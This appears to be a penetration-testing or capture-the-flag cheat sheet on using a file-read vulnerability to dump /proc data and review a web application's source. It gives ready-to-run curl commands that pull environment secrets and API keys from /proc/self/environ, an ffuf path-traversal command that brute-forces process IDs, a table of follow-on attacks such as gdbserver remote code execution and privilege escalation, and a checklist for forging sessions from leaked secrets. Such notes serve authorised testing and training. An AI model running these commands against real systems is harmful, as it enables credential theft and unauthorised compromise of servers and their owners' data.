# proc Enumeration & Source Review

## Why /proc first
`/proc/self` follows the *current* process handling your request (the web app). Its `cmdline`, `environ`, `stat`, `cwd`, and `fd/` give away: the app path, the running user, env secrets (`API_KEY`, `HOME`, `PWD`, `DB_*`), the parent process, and loaded libraries.

## Commands through a file-read primitive
```bash
# command line (args are NUL-separated)
curl -s '...?page=/proc/self/cmdline' | tr '\000' ' '
# environment (NUL separated) — biggest secret dump
curl -s '...?page=/proc/self/environ' | tr '\000' '\n'
# parent PID (field 4 of stat) → read the real process (e.g. uvicorn --reload, dotnet run)
curl -s '...?page=/proc/self/stat'          # 4th space-delimited field = PPID
curl -s '...?page=/proc/<ppid>/cmdline' | tr '\000' ' '
# working dir / root
curl -s '...?page=/proc/self/cwd/<app>.py'
# brute PIDs when you don't know the target service
ffuf -u 'http://tgt/?page=../../../../proc/FUZZ/cmdline' -w <(seq 1 10000) -mr 'dotnet|python|java|gunicorn'
# mounts / network for topology
curl -s '...?page=/proc/self/mounts'
curl -s '...?page=/proc/net/tcp'
```

## Common process fingerprints → next actions
| cmdline | Next |
|---|---|
| `python3 /home/dev/app/app.py` / `uvicorn ... app.main:app` | read source at that path; if `--reload` → file write = RCE |
| `dotnet /opt/x/bin/Debug/net6.0/x.dll` | download DLL → decompile (dnSpy/ILSpy) → secrets/deser |
| `java -jar .../x.jar` | download jar → jadx → creds/endpoints |
| `gdbserver --once 0.0.0.0:1337 /bin/true` | gdbserver RCE (remote put + run) |
| cron loop `while true; do ... screen ...` | screen/tmux multiuser attach |
| root script in user-writable dir | binary/script hijack → privesc |

## Source review checklist (once you read the app)
1. Auth: how is the session/JWT/cookie made & verified? secret location (`JWT_SECRET`, `SECRET_KEY`, env `API_KEY`) → forge.
2. Filters: what params are concatenated into `exec`/`system`/`include`/SQL? What blacklist? Where is it applied (one endpoint only)?
3. Hidden endpoints/features: `debug`, `expertmode`, admin routes, `/rails/info/routes`, `/openapi.json`, `/docs`, comment mentions.
4. DB: connection strings, salt order, hash algorithm (needed before cracking).
5. File ops: `os.path.join` (absolute path bypass), `readfile` vs `include`, upload extension map (custom extension → PHP), backup/cron integration.
6. Version pins: `requirements.txt`, `package.json`, `composer.lock` → known CVE lookup.

## Output
- App path + running user + env secrets (record `API_KEY`-style values verbatim — they change per boot)
- Source files read + the exact line where creds/filters/hidden features live
